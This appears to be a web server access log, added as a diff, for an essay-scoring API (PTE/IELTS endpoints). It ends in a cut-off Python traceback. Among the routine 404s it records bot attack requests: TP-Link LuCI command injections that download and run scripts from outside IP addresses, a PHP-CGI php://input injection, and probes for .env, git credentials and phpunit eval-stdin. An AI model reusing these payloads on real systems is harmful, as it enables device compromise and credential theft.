+2024-07-18 11:05:56 INFO:     109.205.213.18:0 - "GET /.git/config HTTP/1.1" 404 Not Found
+2024-07-18 11:05:56 INFO:     109.205.213.18:0 - "GET /.git-credentials HTTP/1.1" 404 Not Found
+2024-07-18 11:05:56 INFO:     109.205.213.18:0 - "GET /docker-compose.yml HTTP/1.1" 404 Not Found
+2024-07-18 11:05:56 INFO:     109.205.213.18:0 - "GET /codebuild.yml HTTP/1.1" 404 Not Found
+2024-07-18 11:09:04 INFO:     172.71.218.46:0 - "POST /pte/summary-spoken-text HTTP/1.1" 200 OK
+2024-07-18 11:14:50 INFO:     172.68.225.80:0 - "POST /pte/summary-writing-text HTTP/1.1" 200 OK
+2024-07-18 11:14:51 INFO:     162.158.114.167:0 - "POST /pte/summary-writing-text HTTP/1.1" 200 OK
+2024-07-18 11:45:12 INFO:     93.82.138.202:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 11:45:12 INFO:     93.82.138.202:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 11:46:10 INFO:     92.249.48.202:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 11:54:29 INFO:     162.142.125.201:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 11:54:38 INFO:     162.142.125.201:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 11:54:50 INFO:     199.45.155.108:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 11:55:00 INFO:     199.45.155.108:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 12:02:52 INFO:     172.71.219.19:0 - "POST /pte/summary-writing-text HTTP/1.1" 200 OK
+2024-07-18 12:02:54 INFO:     172.71.214.123:0 - "POST /pte/summary-writing-text HTTP/1.1" 200 OK
+2024-07-18 12:02:54 INFO:     162.158.178.72:0 - "POST /pte/summary-writing-text HTTP/1.1" 200 OK
+2024-07-18 12:02:59 INFO:     162.158.114.162:0 - "POST /pte/summary-writing-text HTTP/1.1" 200 OK
+2024-07-18 12:08:15 INFO:     149.50.103.48:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 12:19:37 INFO:     45.148.10.202:0 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Unsupported upgrade request.
+Unsupported upgrade request.
+2024-07-18 13:08:16 INFO:     46.19.143.26:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 13:17:55 INFO:     15.204.194.30:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 13:17:57 INFO:     15.204.194.30:0 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+2024-07-18 13:20:10 INFO:     149.50.103.48:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 13:29:48 INFO:     147.185.132.106:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 13:36:29 INFO:     45.148.10.202:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.1" 404 Not Found
+2024-07-18 13:36:29 INFO:     45.148.10.202:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F87.121.112.42%2Fwget.sh%3B+chmod+777+wget.sh%3B+.%2Fwget.sh+tplink%3B+rm+-rf+wget.sh%60) HTTP/1.1" 404 Not Found
+2024-07-18 13:40:46 INFO:     149.50.103.48:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 13:41:37 INFO:     162.158.179.66:0 - "POST /pte/essay HTTP/1.1" 200 OK
+2024-07-18 13:46:43 INFO:     202.112.238.240:0 - "GET /9YyQ HTTP/1.1" 404 Not Found
+2024-07-18 13:46:43 INFO:     202.112.238.240:0 - "GET /CBse HTTP/1.1" 404 Not Found
+2024-07-18 13:46:43 INFO:     202.112.238.240:0 - "POST /mac/index.php HTTP/1.1" 404 Not Found
+2024-07-18 13:46:43 INFO:     202.112.238.240:0 - "POST /api HTTP/1.1" 404 Not Found
+2024-07-18 13:46:43 INFO:     202.112.238.240:0 - "GET /theme/Plugins/clip64.dll HTTP/1.1" 404 Not Found
+2024-07-18 13:46:43 INFO:     202.112.238.240:0 - "GET /socket.io/?model=OnePlus&EIO=4&id=PrivateChat()&transport=polling&release=9&manf=OnePlus HTTP/1.1" 404 Not Found
+2024-07-18 13:57:16 INFO:     35.240.121.17:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 14:02:19 INFO:     185.50.25.38:0 - "GET /wp-login.php HTTP/1.1" 404 Not Found
+2024-07-18 14:16:06 INFO:     68.178.157.215:0 - "GET /wp-login.php HTTP/1.1" 404 Not Found
+2024-07-18 14:23:08 INFO:     149.50.103.48:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 14:27:34 INFO:     185.224.128.43:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 14:39:33 INFO:     199.45.155.77:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 14:39:42 INFO:     199.45.155.77:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 14:50:17 INFO:     45.142.182.78:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 15:10:10 INFO:     87.236.176.82:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 15:12:31 INFO:     101.36.106.134:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 15:24:26 INFO:     187.102.16.15:0 - "GET /wp-login.php HTTP/1.1" 404 Not Found
+2024-07-18 15:31:17 INFO:     5.8.11.202:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 15:42:35 INFO:     94.156.69.199:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 15:42:35 INFO:     94.156.69.199:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 15:42:35 INFO:     94.156.69.199:0 - "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 404 Not Found
+2024-07-18 15:42:36 INFO:     94.156.69.199:0 - "GET /xmlrpc.php?rsd HTTP/1.1" 404 Not Found
+2024-07-18 15:42:36 INFO:     94.156.69.199:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 15:42:36 INFO:     94.156.69.199:0 - "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 Not Found
+2024-07-18 15:42:36 INFO:     94.156.69.199:0 - "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1" 404 Not Found
+2024-07-18 15:42:36 INFO:     94.156.69.199:0 - "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 Not Found
+2024-07-18 15:42:36 INFO:     94.156.69.199:0 - "GET /website/wp-includes/wlwmanifest.xml HTTP/1.1" 404 Not Found
+2024-07-18 15:42:36 INFO:     94.156.69.199:0 - "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 404 Not Found
+2024-07-18 15:42:36 INFO:     94.156.69.199:0 - "GET /news/wp-includes/wlwmanifest.xml HTTP/1.1" 404 Not Found
+2024-07-18 15:42:36 INFO:     94.156.69.199:0 - "GET /2020/wp-includes/wlwmanifest.xml HTTP/1.1" 404 Not Found
+2024-07-18 15:42:37 INFO:     94.156.69.199:0 - "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.1" 404 Not Found
+2024-07-18 15:42:37 INFO:     94.156.69.199:0 - "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.1" 404 Not Found
+2024-07-18 15:42:37 INFO:     94.156.69.199:0 - "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1" 404 Not Found
+2024-07-18 15:42:37 INFO:     94.156.69.199:0 - "GET /test/wp-includes/wlwmanifest.xml HTTP/1.1" 404 Not Found
+2024-07-18 15:42:37 INFO:     94.156.69.199:0 - "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.1" 404 Not Found
+2024-07-18 15:42:37 INFO:     94.156.69.199:0 - "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 Not Found
+2024-07-18 15:42:37 INFO:     94.156.69.199:0 - "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 Not Found
+2024-07-18 15:42:38 INFO:     94.156.69.199:0 - "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.1" 404 Not Found
+2024-07-18 15:59:52 INFO:     87.236.20.133:0 - "GET /wp-login.php HTTP/1.1" 404 Not Found
+2024-07-18 16:13:47 INFO:     94.156.68.162:0 - "GET /_profiler/phpinfo HTTP/1.1" 404 Not Found
+2024-07-18 16:15:26 INFO:     149.50.103.48:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 16:46:07 INFO:     110.242.250.111:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 16:54:24 INFO:     66.249.69.198:0 - "GET /robots.txt HTTP/1.1" 404 Not Found
+2024-07-18 16:54:25 INFO:     66.249.69.196:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 17:09:00 INFO:     109.169.10.10:0 - "HEAD / HTTP/1.1" 404 Not Found
+2024-07-18 17:09:00 INFO:     109.169.10.10:0 - "GET /SCwIXVgzgxIe HTTP/1.1" 404 Not Found
+2024-07-18 17:09:00 INFO:     109.169.10.10:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 17:24:09 INFO:     37.252.5.132:0 - "GET /wp-login.php HTTP/1.1" 404 Not Found
+2024-07-18 17:26:49 INFO:     46.19.143.26:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 17:41:26 INFO:     141.94.174.211:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 17:41:26 INFO:     141.94.174.211:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 17:45:45 INFO:     92.249.48.202:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 17:47:44 INFO:     99.81.216.206:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 18:02:17 INFO:     45.142.182.78:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 18:09:43 INFO:     91.92.247.56:0 - "GET /assets/.env HTTP/1.1" 404 Not Found
+2024-07-18 18:10:12 INFO:     36.111.67.189:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 18:26:15 INFO:     149.50.103.48:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 18:40:09 INFO:     217.114.43.63:0 - "GET /.env HTTP/1.1" 404 Not Found
+2024-07-18 18:40:09 INFO:     217.114.43.63:0 - "GET /wp-content/ HTTP/1.1" 404 Not Found
+2024-07-18 18:41:28 INFO:     87.236.176.197:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 18:47:55 INFO:     217.114.43.63:0 - "GET /.env HTTP/1.1" 404 Not Found
+2024-07-18 18:47:55 INFO:     217.114.43.63:0 - "GET /wp-content/ HTTP/1.1" 404 Not Found
+2024-07-18 18:48:39 INFO:     172.68.225.148:0 - "POST /pte/summary-writing-text HTTP/1.1" 200 OK
+2024-07-18 18:53:48 INFO:     217.114.43.63:0 - "GET /.env HTTP/1.1" 404 Not Found
+2024-07-18 18:53:49 INFO:     217.114.43.63:0 - "GET /wp-content/ HTTP/1.1" 404 Not Found
+2024-07-18 18:57:54 INFO:     149.50.103.48:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 19:04:54 INFO:     78.187.91.219:0 - "GET /manager/html HTTP/1.1" 404 Not Found
+2024-07-18 19:05:51 INFO:     76.159.131.70:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 19:08:34 INFO:     172.71.214.13:0 - "POST /pte/essay HTTP/1.1" 200 OK
+2024-07-18 19:17:27 INFO:     178.254.29.124:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 19:18:09 INFO:     206.189.229.189:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 19:25:35 INFO:     45.148.10.202:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 19:33:00 INFO:     83.222.191.62:0 - "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 404 Not Found
+2024-07-18 19:33:00 INFO:     83.222.191.62:0 - "POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 404 Not Found
+2024-07-18 19:39:58 INFO:     185.224.128.43:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 19:40:26 INFO:     46.174.191.31:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 19:45:04 INFO:     178.62.74.6:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 20:45:54 INFO:     120.71.59.24:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 20:49:28 INFO:     172.68.225.80:0 - "POST /pte/essay HTTP/1.1" 200 OK
+2024-07-18 20:50:29 INFO:     124.225.164.130:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 20:54:20 INFO:     65.108.80.43:0 - "GET /wp-login.php HTTP/1.1" 404 Not Found
+2024-07-18 21:01:49 INFO:     35.195.123.144:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 21:04:08 INFO:     217.107.219.149:0 - "GET /wp-login.php HTTP/1.1" 404 Not Found
+2024-07-18 21:04:42 INFO:     198.235.24.76:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 21:11:33 INFO:     46.19.143.26:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 21:17:37 INFO:     115.231.78.9:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 21:17:37 INFO:     115.231.78.9:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 21:17:38 INFO:     115.231.78.9:0 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+2024-07-18 21:17:38 INFO:     115.231.78.9:0 - "GET /robots.txt HTTP/1.1" 404 Not Found
+2024-07-18 21:17:58 INFO:     172.71.219.19:0 - "POST /ielts/writing/task-2-essay HTTP/1.1" 200 OK
+2024-07-18 21:18:08 INFO:     165.154.11.206:45782 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+Invalid HTTP request received.
+2024-07-18 21:19:53 INFO:     172.71.210.197:0 - "POST /ielts/writing/task-2-essay HTTP/1.1" 200 OK
+2024-07-18 21:20:05 INFO:     172.71.219.50:0 - "POST /ielts/writing/task-2-essay HTTP/1.1" 200 OK
+2024-07-18 21:20:15 INFO:     172.71.210.35:0 - "POST /ielts/writing/task-2-essay HTTP/1.1" 200 OK
+2024-07-18 21:34:54 INFO:     172.71.215.52:0 - "POST /ielts/writing/task-2-essay HTTP/1.1" 200 OK
+2024-07-18 21:47:29 INFO:     34.125.43.25:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 21:47:29 INFO:     34.125.43.25:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 21:47:29 INFO:     34.125.43.25:0 - "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 404 Not Found
+2024-07-18 21:47:29 INFO:     34.125.43.25:0 - "GET /xmlrpc.php?rsd HTTP/1.1" 404 Not Found
+2024-07-18 21:47:29 INFO:     34.125.43.25:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 21:47:29 INFO:     34.125.43.25:0 - "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 Not Found
+2024-07-18 21:47:29 INFO:     34.125.43.25:0 - "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1" 404 Not Found
+2024-07-18 21:47:29 INFO:     34.125.43.25:0 - "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 Not Found
+2024-07-18 21:47:29 INFO:     34.125.43.25:0 - "GET /website/wp-includes/wlwmanifest.xml HTTP/1.1" 404 Not Found
+2024-07-18 21:47:29 INFO:     34.125.43.25:0 - "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 404 Not Found
+2024-07-18 21:47:30 INFO:     34.125.43.25:0 - "GET /news/wp-includes/wlwmanifest.xml HTTP/1.1" 404 Not Found
+2024-07-18 21:47:30 INFO:     34.125.43.25:0 - "GET /2018/wp-includes/wlwmanifest.xml HTTP/1.1" 404 Not Found
+2024-07-18 21:47:30 INFO:     34.125.43.25:0 - "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.1" 404 Not Found
+2024-07-18 21:47:30 INFO:     34.125.43.25:0 - "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.1" 404 Not Found
+2024-07-18 21:47:30 INFO:     34.125.43.25:0 - "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1" 404 Not Found
+2024-07-18 21:47:30 INFO:     34.125.43.25:0 - "GET /test/wp-includes/wlwmanifest.xml HTTP/1.1" 404 Not Found
+2024-07-18 21:47:30 INFO:     34.125.43.25:0 - "GET /media/wp-includes/wlwmanifest.xml HTTP/1.1" 404 Not Found
+2024-07-18 21:47:30 INFO:     34.125.43.25:0 - "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.1" 404 Not Found
+2024-07-18 21:47:30 INFO:     34.125.43.25:0 - "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 Not Found
+2024-07-18 21:47:30 INFO:     34.125.43.25:0 - "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 Not Found
+2024-07-18 21:47:30 INFO:     34.125.43.25:0 - "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.1" 404 Not Found
+2024-07-18 21:49:24 INFO:     172.71.219.49:0 - "POST /pte/summary-writing-text HTTP/1.1" 200 OK
+2024-07-18 21:55:00 INFO:     149.50.103.48:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 21:57:04 INFO:     64.62.197.26:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 21:59:16 INFO:     64.62.197.28:0 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+2024-07-18 21:59:46 INFO:     64.62.197.30:0 - "GET /geoserver/web/ HTTP/1.1" 404 Not Found
+2024-07-18 22:05:03 INFO:     217.114.43.63:0 - "GET /.env HTTP/1.1" 404 Not Found
+2024-07-18 22:05:03 INFO:     217.114.43.63:0 - "GET /wp-content/ HTTP/1.1" 404 Not Found
+2024-07-18 22:20:21 INFO:     84.54.51.37:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F74.50.81.158%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60) HTTP/1.1" 404 Not Found
+2024-07-18 22:24:34 INFO:     162.158.114.2:0 - "POST /pte/essay HTTP/1.1" 200 OK
+2024-07-18 22:25:16 INFO:     45.148.10.202:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.1" 404 Not Found
+2024-07-18 22:25:16 INFO:     45.148.10.202:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F87.121.112.42%2Fwget.sh%3B+chmod+777+wget.sh%3B+.%2Fwget.sh+tplink%3B+rm+-rf+wget.sh%60) HTTP/1.1" 404 Not Found
+2024-07-18 22:31:25 INFO:     109.110.184.222:0 - "GET /.well-known/pki-validation/cloud.php HTTP/1.1" 404 Not Found
+2024-07-18 22:31:28 INFO:     109.110.184.222:0 - "GET /.well-known/acme-challenge/cloud.php HTTP/1.1" 404 Not Found
+2024-07-18 22:31:30 INFO:     109.110.184.222:0 - "GET /wp-admin/network/cloud.php HTTP/1.1" 404 Not Found
+2024-07-18 22:31:32 INFO:     109.110.184.222:0 - "GET /cloud.php HTTP/1.1" 404 Not Found
+2024-07-18 22:31:33 INFO:     109.110.184.222:0 - "GET /cgi-bin/cloud.php HTTP/1.1" 404 Not Found
+2024-07-18 22:31:35 INFO:     109.110.184.222:0 - "GET /css/cloud.php HTTP/1.1" 404 Not Found
+2024-07-18 22:31:37 INFO:     109.110.184.222:0 - "GET /wp-admin/user/cloud.php HTTP/1.1" 404 Not Found
+2024-07-18 22:31:38 INFO:     5.42.211.86:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 22:31:38 INFO:     5.42.211.86:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 22:31:39 INFO:     109.110.184.222:0 - "GET /img/cloud.php HTTP/1.1" 404 Not Found
+2024-07-18 22:31:42 INFO:     109.110.184.222:0 - "GET /wp-admin/css/colors/coffee/cloud.php HTTP/1.1" 404 Not Found
+2024-07-18 22:31:44 INFO:     109.110.184.222:0 - "GET /wp-admin/images/cloud.php HTTP/1.1" 404 Not Found
+2024-07-18 22:31:46 INFO:     109.110.184.222:0 - "GET /images/cloud.php HTTP/1.1" 404 Not Found
+2024-07-18 22:31:48 INFO:     109.110.184.222:0 - "GET /wp-admin/js/widgets/cloud.php HTTP/1.1" 404 Not Found
+2024-07-18 22:31:50 INFO:     109.110.184.222:0 - "GET /wp-admin/css/colors/cloud.php HTTP/1.1" 404 Not Found
+2024-07-18 22:31:53 INFO:     109.110.184.222:0 - "GET /wp-admin/includes/cloud.php HTTP/1.1" 404 Not Found
+2024-07-18 22:31:56 INFO:     109.110.184.222:0 - "GET /wp-admin/css/colors/blue/cloud.php HTTP/1.1" 404 Not Found
+2024-07-18 22:31:58 INFO:     109.110.184.222:0 - "GET /wp-admin/cloud.php HTTP/1.1" 404 Not Found
+2024-07-18 23:04:41 INFO:     109.205.213.18:0 - "GET /.git/config HTTP/1.1" 404 Not Found
+2024-07-18 23:04:56 INFO:     109.205.213.18:0 - "GET /.git/config HTTP/1.1" 404 Not Found
+2024-07-18 23:04:57 INFO:     109.205.213.18:0 - "GET /docker-compose.yml HTTP/1.1" 404 Not Found
+2024-07-18 23:04:57 INFO:     109.205.213.18:0 - "GET /codebuild.yml HTTP/1.1" 404 Not Found
+2024-07-18 23:05:55 INFO:     92.249.48.202:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 23:06:43 INFO:     109.205.213.18:0 - "GET /.git-credentials HTTP/1.1" 404 Not Found
+2024-07-18 23:07:06 INFO:     80.82.77.202:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 23:09:24 INFO:     147.185.132.75:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-18 23:40:43 INFO:     198.244.160.112:0 - "GET /.env HTTP/1.1" 404 Not Found
+2024-07-18 23:40:43 INFO:     198.244.160.112:0 - "POST / HTTP/1.1" 404 Not Found
+2024-07-18 23:40:44 INFO:     198.244.160.112:0 - "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 Not Found
+2024-07-18 23:57:27 INFO:     39.105.120.190:0 - "GET /wp-login.php HTTP/1.1" 404 Not Found
+2024-07-19 00:02:13 INFO:     172.71.219.50:0 - "POST /pte/essay HTTP/1.1" 200 OK
+2024-07-19 00:02:18 INFO:     147.185.132.165:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-19 00:02:24 INFO:     172.71.219.107:0 - "POST /pte/essay HTTP/1.1" 200 OK
+2024-07-19 00:09:20 INFO:     172.71.219.50:0 - "POST /pte/essay HTTP/1.1" 200 OK
+2024-07-19 00:15:50 INFO:     198.244.160.112:0 - "GET /.env HTTP/1.1" 404 Not Found
+2024-07-19 00:15:51 INFO:     198.244.160.112:0 - "POST / HTTP/1.1" 404 Not Found
+2024-07-19 00:15:51 INFO:     198.244.160.112:0 - "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 Not Found
+2024-07-19 00:19:56 INFO:     162.216.150.26:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-19 00:21:07 INFO:     217.114.43.63:0 - "GET /.env HTTP/1.1" 404 Not Found
+2024-07-19 00:21:07 INFO:     217.114.43.63:0 - "GET /wp-content/ HTTP/1.1" 404 Not Found
+2024-07-19 00:26:50 INFO:     172.68.225.25:0 - "POST /pte/essay HTTP/1.1" 200 OK
+2024-07-19 00:33:05 INFO:     51.159.30.40:0 - "GET /inputs.php HTTP/1.1" 404 Not Found
+2024-07-19 00:33:08 INFO:     185.191.126.213:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-19 00:34:45 INFO:     172.71.219.20:0 - "POST /pte/summary-writing-text HTTP/1.1" 200 OK
+2024-07-19 00:37:16 INFO:     185.224.128.43:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-19 00:37:30 INFO:     162.158.179.153:0 - "POST /pte/summary-writing-text HTTP/1.1" 200 OK
+2024-07-19 00:48:46 INFO:     39.101.172.248:0 - "GET /phpmyadmin HTTP/1.1" 404 Not Found
+2024-07-19 01:00:42 INFO:     172.71.219.50:0 - "POST /pte/essay HTTP/1.1" 200 OK
+WARNING:  Unsupported upgrade request.
+Unsupported upgrade request.
+2024-07-19 01:16:36 INFO:     172.68.225.80:0 - "POST /pte/summary-writing-text HTTP/1.1" 200 OK
+2024-07-19 01:20:36 INFO:     149.50.103.48:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-19 01:47:12 INFO:     45.148.10.202:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-19 01:48:07 INFO:     149.50.103.48:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-19 01:50:22 INFO:     46.19.143.26:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-19 01:53:51 INFO:     198.244.160.112:0 - "GET /.env HTTP/1.1" 404 Not Found
+2024-07-19 01:53:51 INFO:     198.244.160.112:0 - "POST / HTTP/1.1" 404 Not Found
+2024-07-19 01:53:52 INFO:     198.244.160.112:0 - "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 Not Found
+2024-07-19 01:59:16 INFO:     198.244.160.112:0 - "GET /.env HTTP/1.1" 404 Not Found
+2024-07-19 01:59:16 INFO:     198.244.160.112:0 - "POST / HTTP/1.1" 404 Not Found
+2024-07-19 01:59:17 INFO:     198.244.160.112:0 - "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 Not Found
+2024-07-19 02:04:49 INFO:     172.68.225.52:0 - "POST /pte/summary-spoken-text HTTP/1.1" 200 OK
+2024-07-19 02:04:50 INFO:     172.71.218.177:0 - "POST /pte/summary-spoken-text HTTP/1.1" 200 OK
+
+Error while request:
+Traceback (most recent call last):
+  File "/root/miniconda3/envs/vardy_tests_env/lib/python3.8/site-packages/anyio/streams/memory.py", line 105, in receive
+    return self.receive_nowait()
+  File "/root/miniconda3/envs/vardy_tests_env/lib/python3.8/site-packages/anyio/streams/memory.py", line 100, in receive_nowait
+    raise WouldBlock
+anyio.WouldBlock
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/root/miniconda3/envs/vardy_tests_env/lib/python3.8/site-packages/anyio/streams/memory.py", line 118, in receive
+    return receiver.item
+AttributeError: 'MemoryObjectItemReceiver' object has no attribute 'item'
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/root/miniconda3/envs/vardy_tests_env/lib/python3.8/site-packages/starlette/middleware/base.py", line 43, in call_next
+    message = await recv_stream.receive()
+  File "/root/miniconda3/envs/vardy_tests_env/lib/python3.8/site-packages/anyio/streams/memory.py", line 120, in receive
+    raise EndOfStream
+anyio.EndOfStream
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/code/aisolus/aisolus/main.py", line 37, in dispatch
+    response = await call_next(request)
+  File "/root/miniconda3/envs/vardy_tests_env/lib/python3.8/site-packages/starlette/middleware/base.py", line 46, in call_next
+    raise app_exc
+  File "/root/miniconda3/envs/vardy_tests_env/lib/python3.8/site-packages/starlette/middleware/base.py", line 36, in coro
+    await self.app(scope, request.receive, send_stream.send)
+  File "/root/miniconda3/envs/vardy_tests_env/lib/python3.8/site-packages/starlette/middleware/exceptions.py", line 75, in __call__
+    raise exc
+  File "/root/miniconda3/envs/vardy_tests_env/lib/python3.8/site-packages/starlette/middleware/exceptions.py", line 64, in __call__
+    await self.app(scope, receive, sender)
+  File "/root/miniconda3/envs/vardy_tests_env/lib/python3.8/site-packages/fastapi/middleware/asyncexitstack.py", line 21, in __call__
+    raise e
+  File "/root/miniconda3/envs/vardy_tests_env/lib/python3.8/site-packages/fastapi/middleware/asyncexitstack.py", line 18, in __call__
+    await self.app(scope, receive, send)
+  File "/root/miniconda3/envs/vardy_tests_env/lib/python3.8/site-packages/starlette/routing.py", line 680, in __call__
